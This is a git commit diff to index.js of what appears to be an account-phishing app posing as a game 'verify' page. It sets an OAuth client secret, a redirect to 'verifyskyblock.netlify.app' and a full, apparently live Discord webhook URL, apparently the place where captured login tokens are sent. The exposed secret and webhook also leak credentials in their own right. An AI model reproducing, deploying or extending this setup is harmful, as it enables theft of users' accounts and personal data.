fce2b881b405a90dc63dbb67059cb7b520cb9c35
cheatenginefree <111660704+cheatenginefree@users.noreply.github.com>
2022-12-09 15:50:51 +0000

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,8 @@
 //Config
 const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
 const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const redirect_uri = 'https://verifyskyblock.netlify.app'
+const webhook_url = 'https://discord.com/api/webhooks/1045338697500999740/-fGf7uq6z1N6HjAqd-9KaCncQ-YmgHjZmBOvpw50EjjVfwrgz8KAj0p134je-E5299Mk'
 //Requirements
 const axios = require('axios')
 const express = require('express')
